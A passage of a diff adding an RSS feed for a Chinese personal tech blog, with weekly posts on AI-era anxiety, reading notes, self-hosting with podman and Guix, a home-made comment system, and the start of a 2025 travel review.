@@ -1,0 +1,925 @@
+<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>狐狸反走矣</title><pubDate>Wed, 25 Feb 2026 09:39:57 Z</pubDate><atom:link href="https://blog.southfox.me/rss2.xml" rel="self" type="application/rss+xml" /><link>https://blog.southfox.me</link><generator>https://dthompson.us/projects/haunt.html</generator><item><title>FoxThinking #19: 不要恐惧</title><guid>https://blog.southfox.me/2026/02/fox-thinking-19/index.html</guid><pubDate>Mon, 23 Feb 2026 21:22:00 Z</pubDate><link>https://blog.southfox.me/2026/02/fox-thinking-19/index.html</link><description>&lt;p&gt;别人恐惧我就摸鱼。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;别人恐惧我就摸鱼。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;p&gt;就算是只靠 RSS 摄取新闻的人也能发现现在变化的速度太快了，聊天、模型、蒸馏、微调、MCP、Agent、
+OpenClaw ……感觉个把月就有新的概念提出来。不由得让人产生一种比错失恐惧（Fear of missing out，简
+称：FOMO）更深入的恐惧，恐惧变得过时（fear of becoming obsolete, 简称 FOBO）。&lt;/p&gt;&lt;p&gt;要说我没产生过焦虑那当然是在说谎，只是我花了点时间想了想得出了下面的推论：&lt;/p&gt;&lt;p&gt;如果以后人工智能的发展真能达到「他们」所宣扬的那样简便好用无需任何背景知识，那么直接用就是了，可能
+就像是什么「无条件基本收入」吧；或者依然还需掌握相关知识背景的人来编排、管理相关资源，那么等用到的
+再学也不迟，临时抱佛脚可不是稀奇的事。我在现在看到的尽是沙堡，没有什么能长久存在的东西……&lt;/p&gt;&lt;p&gt;况且关于「过时」，想想我现在用着 Emacs 配点 Lisp 语言写出这篇博文我就觉得，「过时」似乎并没有什么
+太在意的，二三十年前人们写着 if-else 现在仍然写着 if-else ，我相信二三十年后依然需要 if-else 。
+我想还是把精力放在更值得关注的事吧，例如「更值得过的生活是什么样的生活？」，这个老问题已经存在了许久，
+古代哲人近代哲人都作出了很不错回答，但并没有个百分百适合我的回答，相信就算之后出现能作出最
+佳回答的「AI 哲人王」也不行。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;h3 id=&quot;Exploringwhysomechildrenstruggletolearnmath&quot;&gt;&lt;a href=&quot;https://phys.org/news/2026-02-exploring-children-struggle-math.html&quot; class=&quot;external_link&quot;&gt;Exploring why some children struggle to learn math&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;为什么有些孩子在数学学习上有困难？这些孩子并非不理解相关逻辑，而是监测和调整行为相关区域的活动较弱，或者
+换个方式说，就是倔，无法改变自己对错误的认知。&lt;/p&gt;&lt;p&gt;不只是儿童可能成人也有这种倾向，在工作中遇到相同报错出现了几次日志就往上翻几下就能找到原因但还是
+一直死磕的人，可能这就一种相同的特质，推测这种特质对于在一条道路走下去的场景是会有所帮助吧。
+嗯，大脑，真神奇啊。&lt;/p&gt;&lt;h3 id=&quot;GitHubActionsIsSlowlyKillingYourEngineeringTeam-IanDuncan&quot;&gt;&lt;a href=&quot;https://www.iankduncan.com/engineering/2026-02-05-github-actions-killing-your-team/&quot; class=&quot;external_link&quot;&gt;GitHub Actions Is Slowly Killing Your Engineering Team - Ian Duncan&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;又一篇对 Github Actions 的吐槽文，可情况确实如此。Github 上 Action 日志查看卡死我的浏览器已经是频频出
+现的事了，甚至我还不是老机器，而是去年买的 32G 内存搭载 Intel Core Ultra 9 285H (16) @ 5.4GHz CPU 的
+设备，这对于一个大公司来说是会出现的问题吗（不过想到现在微软能让记事本都出远程执行漏洞，我就释怀了 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; ）？&lt;/p&gt;&lt;p&gt;而且在 CICD 明显要往更通用配置和流程管理的方向发展时，继续守着折磨人的 Yaml 和有点让人惊讶的 npm 生态还是
+不太行，现在的集成工程师值得用一个更加适用的编程语言来管理复杂度和整个流程。&lt;/p&gt;&lt;h3 id=&quot;WhyClojure?&quot;&gt;&lt;a href=&quot;https://gaiwan.co/blog/why-clojure/&quot; class=&quot;external_link&quot;&gt;Why Clojure?&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;为什么用 Clojure ？因为 Clojure 对于使用它的人也提出了更高要求，我觉得用编程解决问题应该是件满足好奇并且
+快乐的事，所以我觉得用 Clojure 就挺好的。&lt;/p&gt;&lt;h3 id=&quot;那艺娜：滤镜之下-微信公众号&quot;&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/1AdcYfVqo4kIQ09RyiPXeQ&quot; class=&quot;external_link&quot;&gt;那艺娜：滤镜之下 - 微信公众号&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;梗后真实的人……&lt;/p&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;春节假期结束了，勉强坚持结构性没被打碎，比去年好了点。不过自己想做的事倒是没做出多少还是有点遗憾，不过往好了想
+至少还是尽可能把人际关系打理了下。谁能真正做到真正独行呢？有个情感支持网还是很有必要，不过对我这种只想躺在
+被窝里待着不动的狐来说短时间高强度社交还是有点太超过了……&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.solidot.org/story?sid=83538&quot; class=&quot;external_link&quot;&gt;奇客Solidot | Windows 记事本爆出一个远程代码执行漏洞&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #18: 除夕</title><guid>https://blog.southfox.me/2026/02/fox-thinking-18/index.html</guid><pubDate>Mon, 16 Feb 2026 23:18:00 Z</pubDate><link>https://blog.southfox.me/2026/02/fox-thinking-18/index.html</link><description>&lt;p&gt;除夕了，在零点的钟声的大战级别的爆竹声来临前来写下周刊吧，只是这个星期完全没有什么空余时间（
+或者说有也给自己躺着回复精力了）来写周刊，所以就暂时先这样吧。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;除夕了，在零点的钟声的大战级别的爆竹声来临前来写下周刊吧，只是这个星期完全没有什么空余时间（
+或者说有也给自己躺着回复精力了）来写周刊，所以就暂时先这样吧。&lt;/p&gt;&lt;p&gt;不过有个感悟就是果然 ADHD 特征问题就是自律问题从而导致的睡眠问题，这个是这几天在睡好和根本没睡的状态中对比实验中
+得出的，希望今年能多多睡好点吧。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://jandan.net/p/122078&quot; class=&quot;external_link&quot;&gt;科学家发现ADHD其实是一种节律障碍 - 煎蛋&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #17: 想想春天的速度</title><guid>https://blog.southfox.me/2026/02/fox-thinking-17/index.html</guid><pubDate>Mon, 09 Feb 2026 21:15:00 Z</pubDate><link>https://blog.southfox.me/2026/02/fox-thinking-17/index.html</link><description>&lt;p&gt;过了立春，阴冷的寒气正在消散，开始能感受到天空中的若有若无的春气，可我怎么还在搞服务器。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;过了立春，阴冷的寒气正在消散，开始能感受到天空中的若有若无的春气，可我怎么还在搞服务器。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;p&gt;之前在&lt;a href=&quot;/2026/01/fox-thinking-13/&quot;&gt;节气差异&lt;/a&gt;周刊里摆弄节气时就在想着看看季节的速度了。这个世界是连续的（如果你是在
+普朗克尺度下过活的人或智慧生命，请联系我），意味着事物总有个发展的过程。季节中每天的进
+展应该能「测量」得到，是气温吗？或许诗意一点可以是报春植物的情况，测测一天过去，植物花朵开放
+的「阵线」往前推进了多少公里就是「春天的速度」了。&lt;/p&gt;&lt;p&gt;我很想获取点数据算算看春天的大概速度然后在春天实际到来那天好好加强一下感官品味下周
+边，就当是在「迎客」。可惜上周所有能做事的时间都丢给了服务重装上，没有什么时间推进其它感兴趣的
+事上，希望能在春天实际来到我这里前把自托管服务部署好。&lt;/p&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;因为上周都是在搞自托管的事（几口气部署了十二个服务），所以没什么精力读点东西了，不过折腾中也是鼓捣了
+挺多东西的，希望在结束相关部署后能够整理出一些博文出来，这里先简单提一下：&lt;/p&gt;&lt;h3 id=&quot;Allinpodman&quot;&gt;All in podman&lt;/h3&gt;&lt;p&gt;将新装的服务都用普通账号 Rootless 容器部署了，折腾起来踩了很多坑，基本上也都是因为 Rootless 导致
+的。在排错网络、文件权限之类的问题开始怀疑为了这没体验过的安全性弄得这么麻烦值得吗？不过至少最后也算是
+弄出来了吧。&lt;/p&gt;&lt;p&gt;没有守护进程的 podman 明显好处就是 http_proxy 这种环境变量说设就是设了，终于不用怀疑到底是代理的问题
+还是容器编排层面还是容器里面的问题了……感觉每个试图尝试用环境变量指定代理的 docker 用户都踩过这个坑。然后是
+得自己去手动持久化容器，可能对其他人要 export 成 systemd service ，对我来说刚好能用 shepherd 来管理，
+所以也不是一个麻烦的点。&lt;/p&gt;&lt;h3 id=&quot;很多地鼠&quot;&gt;很多地鼠&lt;/h3&gt;&lt;p&gt;从头开始的机会意味着能选些其它服务，我把之前的 matrix 聊天服务从 synapse 换成了 continuwuity ，
+wallabag 换成了 readeck ：一个用 Go + Sqlite 的稍后读
+应用。很轻巧却也有很多小毛刺，比如没有用 GET 触发获取文章的方式导致依赖插件或者自己用 API 糊啦、没有重新拉取
+文章啦、文章竟然不排重啦等。不过鉴于 readeck 技术栈比起 wallabag 的 php 确实更合适个人使用
+就先自适应了，如果实在受不了那就临阵学点 Go 然后自己改吧。&lt;/p&gt;&lt;p&gt;发现自己用得很多程序和工具都是用 Go 写的，难道我真该正经学下 Go 了？&lt;/p&gt;&lt;h3 id=&quot;大吃特吃树莓派&quot;&gt;大吃特吃树莓派&lt;/h3&gt;&lt;p&gt;也是将一些明显只有自己在用的 rss 阅读器还有稍后读应用都拆开来部署到树莓派上了，甚至最后还部署了个 Vaultwarden 密
+码管理服务和 Searxng 聚合搜索服务。现在树莓派爆炸下线的话会让我感到很麻烦了，或许这也是我在好好利用
+树莓派的表现吧。&lt;/p&gt;&lt;h3 id=&quot;大阵炼成&quot;&gt;大阵炼成&lt;/h3&gt;&lt;p&gt;如果只是简单的部署使用一些服务确实不费什么精力时间，不过这周我在把部署这套流程融进我的 Guix 配置里，誓要做到一套
+配置 reconfigure 后就能直接阵法展开，将相关服务以及参数还有最后的备份流程给准备好，这里耗掉的精力就多了。今天
+还弄了一下 zfs ，打算用上面的原子化快照来方便后续的备份流程（否则 forgejo 下面的一大堆仓库用 dump 来备份也太
+折磨人了）。&lt;/p&gt;&lt;p&gt;不过这些东西就是很水磨工夫要自己慢慢推进，等我干好以后就一定要……可惜运维这事想做的话总能挑出点活来做，希望能尽快爬出
+这个兔子洞吧。&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #16: 信息毒害胆怯</title><guid>https://blog.southfox.me/2026/02/fox-thinking-16/index.html</guid><pubDate>Mon, 02 Feb 2026 23:55:00 Z</pubDate><link>https://blog.southfox.me/2026/02/fox-thinking-16/index.html</link><description>&lt;p&gt;应当坚信，信息就像食物，来路不明的信息就像来路不明的食物，随意摄入会导致出现在某位视频主
+的「这是 ta 几天内身体发生的变化」系列视频上。&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;应当坚信，信息就像食物，来路不明的信息就像来路不明的食物，随意摄入会导致出现在某位视频主
+的「这是 ta 几天内身体发生的变化」系列视频上。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;p&gt;老鼠应该尽量不生病，因为它们吃不了老鼠药。不过确实老鼠在人们心中一直有着生命力顽强的印象，似乎老鼠药
+也不能完全扑杀老鼠。这是因为老鼠有一种叫做「毒害胆怯」 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 的现象，碰上未知的食物并不会马上
+就吃而是会犹豫一阵子，如果看到其它品尝者生病或者死亡，那么老鼠们就会避开这种食物。&lt;/p&gt;&lt;p&gt;现在的信息场上充斥着各种标题党（Clickbait)、鼓噪情绪党（Ragebait)，在摄入这些信息时还是要像老鼠
+一样「犹豫」那么几下的，最好还可以观测一下摄入过这些信息之后的症状。从这方面来说，最佳方式就是等一会，
+等这些信息「放凉」。这里我觉得较好的方式就是 RSS 了，可以自主搜集一些质量较高的订阅源，也可以等待那么
+几天集中「清理」信息，如果间隔几天有时候确实能看到后续情况。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://protesilaos.com/commentary/2026-01-28-touching-grass/&quot; class=&quot;external_link&quot;&gt;Touching grass - Protesilaos Stavrou: Master feed with all updates&lt;/a&gt;: 不要和现实脱节，
+迫在眉睫触手可达的世界是一种幻觉。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.solidot.org/story?sid=83408&quot; class=&quot;external_link&quot;&gt;Windows 11 集成 Copilot 之后状况越来越糟 - 奇客Solidot–传递最新科技情报&lt;/a&gt;：我已经看到个人电脑
+上 Linux 的世界到来，反正微软已经靠做云服务商吃饱饱了，操作系统这种事还是给「专业」的人和社区
+来做吧。而且没人想要一个不能「离线」的操作系统。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/tmythicator/lichess.el&quot; class=&quot;external_link&quot;&gt;lichess.el&lt;/a&gt;: 在 Emacs 里玩国际象棋或者看赛局，我真觉得挺有用……好吧，因为我就是 Emacs 拥趸！&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.psychologytoday.com/us/blog/read-like-a-psychologist/202601/is-it-adhd-maybe-maybe-not&quot; class=&quot;external_link&quot;&gt;Is it ADHD? Maybe. Maybe Not. - Psychology Today: The Latest&lt;/a&gt;: 可能我的注意力不集中症状
+表现就是睡太少了，还是得多睡睡。&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.marginalia.nu/log/a_129_finding_audience/&quot; class=&quot;external_link&quot;&gt;Why you should probably tell your audience what your blog posts are about as early as possible&lt;/a&gt;:
+作为博文最好马上就抛出主题，防止在慢慢切题中消磨读者耐心，这种方式在新闻界称之为「倒金字塔」。我感觉我的博客的
+摘要部分似有似无的就用到了这种方式，不过感觉用力过猛就会变成标题党。&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;观影&quot;&gt;观影&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://fosdem.org/2026/schedule/events/&quot; class=&quot;external_link&quot;&gt;FOSDEM 2026 - Events&lt;/a&gt;: 周末一直在赛博逛展，这里瞧瞧这个讲座然后不一会又看跳另一个讲座。很多讲座受限于演讲
+时间都不能讲太深入的话题，但有这么一个大的盛事能将自由软件社区聚集起来也是让人兴奋啊。&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;一月三十号的时候我用的便宜服务提供商 Cloudcone 其中一个线路遭到骇客入侵：&lt;a href=&quot;https://status.cloudcone.com/incidents/346624&quot; class=&quot;external_link&quot;&gt;Major incident: Hypervisor Outage | Status Page&lt;/a&gt;&lt;/p&gt;&lt;p&gt;很不幸我其中一台机器就放在 Cloudcone 上面，虽然有些损失但幸好还能部分重建，刚好也趁着这一波相当于重置一下
+服务了。没备份的反正都是不重要的，但是还是很麻烦，这几天一直在忙着将服务用 Guix 整理和建立中，希望这周能搞定吧。&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Poison_shyness&quot; class=&quot;external_link&quot;&gt;Poison shyness - Wikipedia&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>FoxThinking #15: I build this city</title><guid>https://blog.southfox.me/2026/01/fox-thinking-15/index.html</guid><pubDate>Mon, 26 Jan 2026 21:25:00 Z</pubDate><link>https://blog.southfox.me/2026/01/fox-thinking-15/index.html</link><description>&lt;p&gt;I build the city on car and cons ~♫&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;I build the city on car and cons ~♫&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;p&gt;这周在做一件老早就想做的事，自己搓一个评论系统。是的，很多人都做过我相信也有很多很好的评论系统存在。&lt;/p&gt;&lt;p&gt;但它们都不会做 org-mode 支持，那么也只能自己上了吧。自从我这几年写得越来越多 org-mode 而 markdown 写
+得越来越少后，我已经越来越搞不清 markdown 链接语法是 ()[] 还是 []() 还有到底是链接在前还是描述在前了。&lt;/p&gt;&lt;p&gt;在今年一月早些时候 spritely 组织发布了新的
+文章：&lt;a href=&quot;https://spritely.institute/news/mandy-activitypub-on-goblins.html&quot; class=&quot;external_link&quot;&gt;Mandy: ActivityPub on Goblins — Spritely Institute&lt;/a&gt; 这下可不是瞌睡时递上了枕头吗，我一直
+对 Goblins 这个「誓要夺回网络」的下一代（非炒币）分布式网络框架感兴趣。一两年前简单试了下却摸索不出头绪，但经过二
+五年一整年的折腾我对自己投入在上面的「技能点」有了些信心想着正好来试下了。这周一开始的摸索也是没有头绪，
+却在慢慢实验后慢慢开始「悟」了，现在陷入折腾有效果越有折腾劲的阶段。&lt;/p&gt;&lt;p&gt;仓库是： &lt;a href=&quot;https://git.southfox.me/southfox/fairy-ring&quot; class=&quot;external_link&quot;&gt;southfox/fairy-ring - Gitea: Git with a cup of tea&lt;/a&gt;&lt;/p&gt;&lt;p&gt;取 fairy-ring 作为名字主要是因为框架叫 Goblins 所以想取一个西幻点名字，然后想到蘑菇环也叫做 fairy-ring ，同时蘑菇
+对应的真菌也有 Wood wide web &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 联系森林里树木的能力。最后就以这种诡异的命名角度蹭到了评论应用。&lt;/p&gt;&lt;p&gt;从去年九月开始从博客框架、 org-mode 解析器、代码高亮……到现在的评论应用，自己慢慢建造自己的「城市」还是
+挺有满足感的。&lt;/p&gt;&lt;p&gt;Someone always playing Corporation games, Who cares
+they're always changing Corporation names. We just want to dance here ~♫ &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://guix.gnu.org/en/blog/2026/gnu-guix-1.5.0-released/&quot; class=&quot;external_link&quot;&gt;GNU Guix 1.5.0 released&lt;/a&gt;: Guix 1.5.0 版本发布了！同时现在 Guix 有了明确的一年两次大版本发布
+的规划，意味着后续二进制安装后不用忍受漫长的 pull 更新环节了，对容器部署或其它系统的包管理器也是利好。
+看着更新的文章发现我漏掉了一些有趣的亮点，例如不在需求 root 权限的守护进程、 shell 容器命令
+里 --emulate-fhs 选项……或许是时候找个时间好好翻读下 guix 文档了？&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.sqlite.org/lang_altertable.html#why_alter_table_is_such_a_problem_for_sqlite&quot; class=&quot;external_link&quot;&gt;Why ALTER TABLE is such a problem for SQLite&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://hakibenita.com/postgresql-unconventional-optimizations&quot; class=&quot;external_link&quot;&gt;Unconventional PostgreSQL Optimizations | Haki Benita&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://atlas9.dev/blog/soft-delete.html&quot; class=&quot;external_link&quot;&gt;The challenges of soft delete | atlas9&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;有关数据库的三篇文章。发现自己确实没好好看过数据库相关的，第一范式第二范式笛卡尔积什么的概念已经模糊不清了。另外在
+工作的项目被迫听老调——不要做外键约束、用 mysql 就行了、要在代码中维护数据逻辑……既然在工作上「坐立难安」后那就得在
+自己项目上好好「玩玩」了，希望之后能好好掌握「全天下最强数据库」之 PostgreSQL 和琢磨一下触发器之类的数据库组件。&lt;/p&gt;&lt;p&gt;-&lt;a href=&quot;https://www.sciencealert.com/cold-weather-doesnt-make-you-sick-heres-whats-really-to-blame&quot; class=&quot;external_link&quot;&gt;Cold Weather Doesn't Make You Sick. Here's What's Really to Blame. : ScienceAlert&lt;/a&gt;: 受寒是感冒的主因
+吗？其实病毒才是感冒的主因，寒冷主要还是起到推波助澜的作用：冷空气会降低温度让喉腔血管收缩削弱免疫反应。加上寒冷室内人们
+扎堆病毒更容易存活传播……不过我估计我的鼻病毒一直都在我的喉管里，除了受寒还有每次吃得太甜太咸让浓度失衡也会让病
+毒重新占领高地，给我来个半周一周的难受时光让我怀念无痛无病的健康时光。这样说的话鼻病毒也是另一种健康生活提醒小帮手呢（&lt;/p&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;连续三天更新三篇博文的高产节奏果然还是不太适合我，所以这周就摸了……！&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Mycorrhizal_network&quot; class=&quot;external_link&quot;&gt;Mycorrhizal network - Wikipedia&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=K1b8AhIsSYQ&quot; class=&quot;external_link&quot;&gt;Starship - We Built This City (Official Music Video) {HD} - YouTube&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>2025 年终总结</title><guid>https://blog.southfox.me/2026/01/2025-annual-review/index.html</guid><pubDate>Tue, 20 Jan 2026 15:27:00 Z</pubDate><link>https://blog.southfox.me/2026/01/2025-annual-review/index.html</link><description>&lt;p&gt;什么，已经是 2026 年了？！（事不过三，让我最后用这开头一次……）&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;什么，已经是 2026 年了？！（事不过三，让我最后用这开头一次……）&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;p&gt;二五年过去，就意味着二十一世纪已过去四分之一了，毫无实感啊。&lt;/p&gt;&lt;h2 id=&quot;九寨沟&quot;&gt;九寨沟&lt;/h2&gt;&lt;p&gt;首先在三月份心血来潮到九寨沟旅游，这个时间点对看点是看水的九寨沟是淡季。不过我却感到惊喜，因为这个时间点是冬春交融的时候，
+气温舒适还能看到令我感到新奇的已经慢慢化开的雪景（嗯，我可是南狐，雪景当然没怎么见过）。&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://media.southfox.me/media_attachments/files/114/097/653/150/749/613/original/634242f0d5a9de57.jpg&quot; alt=&quot;户外场景的垂直照片，展示了一个树木繁茂的森林，一条木质步道穿过其中。步道位于照片左侧，由几级浅色木板台阶组成，呈弧形向上延伸，消失在树林深处。步道两侧的地面上覆盖着稀疏的雪。其中充满了高耸的树木，树干呈深棕色，树枝向上延伸覆盖着绿色的针叶。树木密集排列，一些树干上可以看到浅色的苔藓或地衣。右侧靠近前面的树干上，靠着一个浅棕色的布袋。&quot; href=&quot;https://media.southfox.me/media_attachments/files/114/097/653/150/749/613/original/634242f0d5a9de57.jpg&quot; class=&quot;external_link&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;户外场景的垂直照片，展示了一个树木繁茂的森林，一条木质步道穿过其中。步道位于照片左侧，由几级浅色木板台阶组成，呈弧形向上延伸，消失在树林深处。步道两侧的地面上覆盖着稀疏的雪。其中充满了高耸的树木，树干呈深棕色，树枝向上延伸覆盖着绿色的针叶。树木密集排列，一些树干上可以看到浅色的苔藓或地衣。右侧靠近前面的树干上，靠着一个浅棕色的布袋。&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img src=&quot;https://media.southfox.me/media_attachments/files/114/097/653/141/193/119/original/b40733ec507fb68f.jpg&quot; alt=&quot;户外风景照片，展现群山环绕的开阔山谷。照片中心是一片被雪覆盖的平坦地面有不规则的裂缝。可看到一些裸露呈黄色的钙华。照片背景是连绵的山脉，山峰呈现出深灰色或黑色，山顶覆盖着白雪。山峰的轮廓呈现出锯齿状的线条。山谷两侧的山坡上覆盖着茂密的森林，树木呈深绿色。天空呈现出阴沉的灰色，云层低垂。&quot; href=&quot;https://media.southfox.me/media_attachments/files/114/097/653/141/193/119/original/b40733ec507fb68f.jpg&quot; class=&quot;external_link&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;户外风景照片，展现群山环绕的开阔山谷。照片中心是一片被雪覆盖的平坦地面有不规则的裂缝。可看到一些裸露呈黄色的钙华。照片背景是连绵的山脉，山峰呈现出深灰色或黑色，山顶覆盖着白雪。山峰的轮廓呈现出锯齿状的线条。山谷两侧的山坡上覆盖着茂密的森林，树木呈深绿色。天空呈现出阴沉的灰色，云层低垂。&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img src=&quot;https://media.southfox.me/media_attachments/files/114/097/765/256/364/626/original/9c01ea36a98f1317.jpg&quot; alt=&quot;高角度拍摄的户外风景照片，展示了一个雪覆盖的山谷和一组石灰华池。照片中心是一组多层叠错的浅色石灰华池，池中蓄满了清澈的碧蓝色水。池水呈现出明亮的蓝色和绿色，池塘的形状不规则，由浅色的岩石边缘分隔开，形成一个个小型的水域。在照片的下方可看到一座传统的中国式建筑，屋顶呈深灰色，建筑的墙壁呈浅棕色。建筑周围覆盖着白雪和枯萎的树木。照片背景是覆盖着白雪的山坡，山坡上覆盖着稀疏的树木，树木呈深棕色和灰色，在雪地上投下细长的影子。山坡的轮廓清晰，呈现出锯齿状的线条。在照片的右侧可以看到一条小路，上面有一些游客在观赏风景。&quot; href=&quot;https://media.southfox.me/media_attachments/files/114/097/765/256/364/626/original/9c01ea36a98f1317.jpg&quot; class=&quot;external_link&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;高角度拍摄的户外风景照片，展示了一个雪覆盖的山谷和一组石灰华池。照片中心是一组多层叠错的浅色石灰华池，池中蓄满了清澈的碧蓝色水。池水呈现出明亮的蓝色和绿色，池塘的形状不规则，由浅色的岩石边缘分隔开，形成一个个小型的水域。在照片的下方可看到一座传统的中国式建筑，屋顶呈深灰色，建筑的墙壁呈浅棕色。建筑周围覆盖着白雪和枯萎的树木。照片背景是覆盖着白雪的山坡，山坡上覆盖着稀疏的树木，树木呈深棕色和灰色，在雪地上投下细长的影子。山坡的轮廓清晰，呈现出锯齿状的线条。在照片的右侧可以看到一条小路，上面有一些游客在观赏风景。&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;其中我最满意的是这个场景：&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://media.southfox.me/media_attachments/files/114/132/851/338/564/545/original/963a6962927f513f.jpg&quot; alt=&quot;户外风景照片，展现了一个部分结冰的湖泊，湖水呈鲜艳的蓝绿色。前景中，几棵枯树的枝干树皮呈浅灰色。湖泊后方为一座山脉的陡峭岩壁呈灰色，上面覆盖着稀疏的绿色针叶林。通过一个光秃的树干将后面的湖泊分为两处，画面左侧是已经消融的湖水；画面右侧，两棵高大的针叶树占据了部分视野，树干棕色，针叶呈深绿色。&quot; href=&quot;https://media.southfox.me/media_attachments/files/114/132/851/338/564/545/original/963a6962927f513f.jpg&quot; class=&quot;external_link&quot; /&gt;&lt;figcaption&gt;&lt;span&gt;户外风景照片，展现了一个部分结冰的湖泊，湖水呈鲜艳的蓝绿色。前景中，几棵枯树的枝干树皮呈浅灰色。湖泊后方为一座山脉的陡峭岩壁呈灰色，上面覆盖着稀疏的绿色针叶林。通过一个光秃的树干将后面的湖泊分为两处，画面左侧是已经消融的湖水；画面右侧，两棵高大的针叶树占据了部分视野，树干棕色，针叶呈深绿色。&lt;/span&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;能非常直观感受到季节交替，因为对这次的时间点太满意了，所以还想着在二五年春夏秋冬交替的时候来场「土用之旅」 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; ，不过立夏那段时间突然工作忙得很，然
+后……就没有下文了，或许可以今年试试在春夏交替出去次？不一年出行完而是分成四年（开始找补）。&lt;/p&gt;&lt;h2 id=&quot;魔都行&quot;&gt;魔都行&lt;/h2&gt;&lt;p&gt;四月份的明日方舟音律联觉开始售卖了，抱着试一试的心态去抢了抢，然后……秒没，感叹怎么明日方舟还有那么多人玩的？不死心一直
+刷新，一两分钟后出现一张中档套餐的余票，鬼使神差的点了进去锁定、付款……咦，我竟然抢到票了？&lt;/p&gt;&lt;p&gt;然后就是准备到上海的行程、机票，到处翻了翻攻略找离场地近的地铁站定了间小旅馆，之后就开始思考能干些什么了，
